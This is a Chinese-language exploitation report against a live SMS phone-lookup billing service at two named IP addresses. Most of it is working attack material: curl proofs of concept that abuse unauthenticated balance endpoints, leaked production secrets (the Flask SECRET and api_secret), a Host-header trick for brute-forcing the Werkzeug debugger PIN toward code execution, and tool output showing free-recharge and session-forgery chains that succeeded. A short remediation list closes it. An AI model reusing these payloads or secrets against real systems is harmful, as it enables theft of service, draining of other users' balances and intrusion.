# 漏洞深挖报告 — 一码快查 (9110 + 8081)

探测时间：2026-07-06 ~ 2026-07-07  
目标：`43.154.128.116:9110`（Flask 计费）、`47.76.163.227:8081`（.NET SMS）

---

## CRITICAL

### 0. 未鉴权无限加余额 `/api/desktop/refund-balance`（已实机打通全链）

**发现**：Werkzeug 调试页在 `decrease-balance` 异常栈的 **下一行** 泄露隐藏路由；对 `refund-balance` 传 `amount: "NaN"` 可再泄露 handler 源码（line ~635）。

**接口**：`POST /api/desktop/refund-balance`  
**鉴权**：无  
**Body**：`{"username":"<任意已注册 user>","amount":9999}`

**泄露 SQL（debugger line 635）**：

```sql
UPDATE accounts SET balance = balance + ? WHERE username = ? AND account_type = 'user'
```

**实测**：

```json
{"ok": true, "amount": 9999.0}
```

**完整利用链（已验证）**：

1. `POST /api/desktop/register` 注册账号  
2. `POST /api/desktop/refund-balance` 任意加余额（0 → 9999）  
3. `POST /api/desktop/decrease-balance` 扣 3 元/次  
4. `POST http://47.76.163.227:8081/create/{api_secret}` 下单 SMS  

工具：`tools/free_recharge_chain.py`、`tools/exploit_poc.py`

**影响**：攻击者可 **完全绕过付费**，无限使用 3 元/次的查号服务，无需卡密、无需管理员权限。

---

### 1. 生产环境开启 Werkzeug Debugger（可导致 RCE）

**触发**：`POST /api/desktop/decrease-balance`，JSON body `{"username":"test","amount":"NaN"}`

**结果**：HTTP 500，返回完整 Werkzeug 交互式调试页（含 `__debugger__=yes` 资源）。

**泄露内容**：

| 类型 | 值 |
|------|-----|
| Flask `SECRET` | `pohZc8RrQkczwHyYZUbX` |
| 部署路径 | `/home/试试看洋芋的新的查具体后台/` |
| 源码文件 | `/home/试试看洋芋的新的查具体后台/app.py` |
| 函数 | `api_desktop_decrease_balance`（~613）、`api_desktop_refund_balance`（~635） |
| 数据库表 | `accounts`（字段 `balance`, `username`, `account_type`） |
| 隐藏路由 | `POST /admin/delete-cards`、`POST /api/desktop/refund-balance` |

**SQL 片段（来自调试页源码上下文）**：

```sql
UPDATE accounts SET balance = balance - ? WHERE username = ? AND account_type = 'user'
```

**影响**：

- 攻击者可读取栈帧、局部变量、部分 `app.py` 源码
- `SECRET` 泄露后可伪造 Flask session cookie
- 若 PIN 被破解或 `DEBUG=True` 下 console 可用，可 **远程代码执行**
- 调试资源可访问：`/?__debugger__=yes&cmd=resource&f=debugger.js`

**PoC**：

```bash
curl -s -X POST 'http://43.154.128.116:9110/api/desktop/decrease-balance' \
  -H 'Content-Type: application/json' \
  -d '{"username":"test","amount":"NaN"}' | head -50
```

---

### 2. Flask SECRET 硬泄露 → Session 伪造面

从调试页 JS 变量提取：`SECRET = "pohZc8RrQkczwHyYZUbX"`（Flask `secret_key`；debugger 页内另有随机 `s=` 参数，二者不同）

可用 `flask.sessions.SecureCookieSessionInterface` 签名 cookie。管理后台检查 `session['admin']`（非空即可），但生产环境对未授权访问会重定向登录页，伪造 session 尚未稳定进 `/admin/users`。

### 2b. Host 头绕过 Debugger PIN 接口（新）

`pinauth` / `printpin` 默认仅信任 `127.0.0.1` / `localhost`。远程攻击需：

```http
GET /api/desktop/decrease-balance?__debugger__=yes&cmd=pinauth&pin=XXX&s=<debugger_secret>
Host: 127.0.0.1:9110
```

实测返回 JSON：`{"auth": false, "exhausted": false}`（可远程爆破 PIN）。

工具：`tools/pin_rce_chain.py`（PIN 正确后可 `cmd=<python>` + `frm=<frame_id>` RCE 读 `app.py`）

**限制**：连续错误 >10 次 `exhausted: true`；需获知服务端 `machine-id` + MAC 才能算对 PIN。

---

## HIGH

### 3. 未鉴权读取敏感配置 `/api/desktop/settings`

无需登录即可读取：

| key | 泄露值 |
|-----|--------|
| `api_secret` | `b9887333ae4c43858c9235e0ac4e0921` |
| `api_domain` | `http://47.76.163.227:8081` |
| `contact_link` | `https://t.me/kuaichaq` |
| `deduct_amount` | `3.0` |

任意 key 均可查询（不存在则返回空字符串），无鉴权、无速率限制。

---

### 4. 未鉴权扣费 `/api/desktop/decrease-balance`

**条件**：目标用户存在且余额 ≥ 扣费金额  
**鉴权**：无（不需要登录、不需要 token）

```bash
curl -X POST 'http://43.154.128.116:9110/api/desktop/decrease-balance' \
  -H 'Content-Type: application/json' \
  -d '{"username":"受害者","amount":3}'
```

**影响**：可对其他用户余额进行未授权扣减（业务损失/DoS）。

**备注**：负数金额被服务端拒绝（`参数不完整`）；`NaN` 触发调试页（见 CRITICAL #1）。

---

### 5. 任意用户枚举 `/api/desktop/user-info`

```bash
GET /api/desktop/user-info?username=<任意用户名>
```

- 存在：200 + `balance` / `status`
- 不存在：404

已确认存在用户：`test`（balance 0.0）。

---

## MEDIUM

### 6. 开放注册无防护

`POST /api/desktop/register` JSON 即可注册，无验证码、无明显频率限制（连续 5 次成功）。

可用于：

- 批量刷号
- 配合其他逻辑漏洞

---

### 7. 信息泄露 — 错误消息区分

| 接口 | 差异 |
|------|------|
| `user-info` | 用户不存在 404 vs 存在 200 |
| `card-recharge` | 卡密不存在 404 / 已使用 / 用户不存在 |
| `decrease-balance` | 余额不足 vs 用户不存在 |

便于用户名/卡密枚举。

---

### 8. 安全响应头缺失

`/api/desktop/settings` 响应无：

- `Content-Security-Policy`
- `X-Frame-Options`
- `Set-Cookie` Secure/HttpOnly（API 本身无 cookie 还好）

`Server: Werkzeug/3.1.8 Python/3.12.3` 直接暴露。

---

## LOW / INFO（8081 SMS API）

### 9. `api_secret` 在 URL 路径中

`/create/{secret}`、`/query/{secret}/{id}`、`/setsms/{secret}/{phone}/{code}`  
Secret 会进入 access log、Referer、代理日志。

### 10. 订单 ID 可猜测枚举

`GET /query/{secret}/{order_id}` 对不存在订单返回 `code:-1`，无鉴权绑定用户。  
知道 `order_id`（UUID 格式）后可查询他人订单状态。

### 11. `create` 接口无限流（实测）

同一 secret 可连续创建多个手机号订单，仅 `-3` 阻止同号重复下单。

### 12. `setsms` 对无订单手机号

返回明文 `没有该手机订单!`（不泄露额外数据，但确认手机号是否下单）。

---

## 未确认 / 误报排除

| 项 | 结果 |
|----|------|
| SQL 注入（settings key） | 未发现 |
| 管理后台弱口令 `admin/admin123` | 登录失败（返回登录页，非 dashboard） |
| 负数扣费增余额 | 被拒绝 |
| SSTI `{{7*7}}` | 未执行 |
| CORS `*` | 未发现 |
| 8081 路径穿越 | 404 |

---

## 攻击链示例（已实机跑通）

运行 `python3 tools/exploit_poc.py` 全部 `[OK]`：

```
[OK] 泄露 api_secret = b9887333ae4c43858c9235e0ac4e0921
[OK] debugger 泄露 Flask SECRET = pohZc8RrQkczwHyYZUbX
[OK] debugger 泄露部署路径 app.py
[OK] debugger 泄露 DB 表 accounts.balance
[OK] 开放注册成功
[OK] 用户枚举成功
[OK] 未鉴权 decrease-balance 已接受请求（无鉴权）
[OK] 8081 下单成功
[OK] Flask session 伪造成功
```

```
1. GET /api/desktop/settings?key=api_secret     → 拿到 SMS secret
2. POST /api/desktop/decrease-balance + NaN     → 拿到 Flask SECRET + app.py 路径
3. 伪造 session / 破解 debugger PIN             → 管理后台 / RCE（PIN 未破，但 SECRET 已泄露）
4. POST /admin/delete-cards（需有效 admin session）→ 破坏卡密
5. 未鉴权 decrease-balance                       → 耗尽用户余额（有余额即可扣）
6. 8081 create + query                           → 滥用 SMS 查询服务
```

---

## 修复建议（给运营方）

1. **立即** `FLASK_DEBUG=0`，禁止 Werkzeug debugger 出现在公网
2. 轮换 Flask `SECRET_KEY` 与 `api_secret`
3. 所有 `/api/desktop/*` 写操作加鉴权（token / session / HMAC）
4. `settings` 接口对敏感 key 要求管理员登录
5. `decrease-balance` 必须校验调用方身份与订单归属
6. 注册加验证码 + 速率限制
7. 8081 secret 改 Header 鉴权，订单查询绑定用户/签名
8. 统一错误响应，避免用户/卡密枚举

---

## 本地复现工具

```bash
python3 tools/vuln_deep_probe.py
```

输出：`analysis/vuln_findings.json`  
调试页样本：`analysis/werkzeug_debug_snippet.html`
